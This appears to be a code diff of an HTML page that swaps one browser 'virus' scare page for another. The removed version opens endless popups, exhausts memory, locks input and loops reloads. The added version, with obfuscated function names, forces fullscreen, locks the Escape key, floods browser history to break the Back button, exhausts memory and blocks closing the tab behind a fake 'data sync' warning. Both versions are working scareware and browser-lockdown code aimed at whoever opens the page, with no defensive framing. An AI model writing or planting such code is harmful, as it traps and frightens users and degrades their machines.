@@ -1,50 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CRITICAL SYSTEM OVERLOAD</title>
-    <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New'; text-align: center; overflow: hidden; }
-        .warning { font-size: 5rem; margin-top: 20%; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-    </style>
-</head>
-<body onclick="infect()">
-    <div class="warning">VIRUS DETECTED<br>PHASE: REPLICATION</div>
-    <p>CLICK ANYWHERE TO RECOVER DATA</p>
-
+<body onclick="payload()">
+    <h1 style="color:red; font-family:sans-serif;">SYSTEM COMPROMISED</h1>
     <script>
-        function infect() {
-            // 1. Recursive Tab Bombing (Phishing/Resource Exhaustion)
-            // Most browsers block popups, but if the user 'allows' them once, this hits.
+        // Obfuscated function names and logic
+        function _0xaf12() {
+            // History API Hijack: Flood history to break "Back" button
+            for(let i=0; i<500; i++) {
+                history.pushState(null, "", location.href + "#" + i);
+            }
+        }
+
+        async function payload() {
+            // 1. Enter Stealth Fullscreen
+            document.documentElement.requestFullscreen();
+            
+            // 2. Lock Keyboard to trap Esc key
+            if (navigator.keyboard) await navigator.keyboard.lock(["Escape"]);
+
+            // 3. Start the History Flood
+            setInterval(_0xaf12, 100);
+
+            // 4. Memory Exhaustion: Simulate a "Viral" spread in RAM
+            let _v = [];
             setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=100,height=100');
-            }, 500);
+                _v.push(new Uint8Array(1024 * 1024).fill(0xCC)); // 1MB chunks
+                if(_v.length > 500) _v = []; // Cycle to avoid instant OS crash but keep browser lagging
+            }, 50);
 
-            // 2. Memory Spike (Heap Exhaustion)
-            // Creating an array that grows exponentially to freeze the UI thread.
-            let payload = [];
-            setInterval(() => {
-                for(let i=0; i<10000; i++) {
-                    payload.push(new Array(1000).fill("SYSTEM_CRITICAL_ERROR"));
-                }
-                console.log("Memory Buffer: " + payload.length);
-            }, 100);
-
-            // 3. Persistent Navigation Trap
-            window.onbeforeunload = function() {
-                return "Are you sure you want to leave? System is currently syncing.";
-            };
-
-            // 4. Keyboard/Mouse Hijack
-            document.documentElement.requestPointerLock();
-            if (navigator.keyboard) navigator.keyboard.lock(["Escape", "F11"]);
-
-            // 5. Infinite Reload Loop (The "Viral" Persistence)
-            setTimeout(() => {
-                while(true) {
-                    location.replace("https://www.google.com");
-                }
-            }, 5000);
+            // 5. The "Loop of No Return"
+            window.onbeforeunload = () => "CRITICAL: DATA SYNC IN PROGRESS. DO NOT CLOSE.";
+            
+            console.log("Payload Active.");
         }
     </script>
 </body>
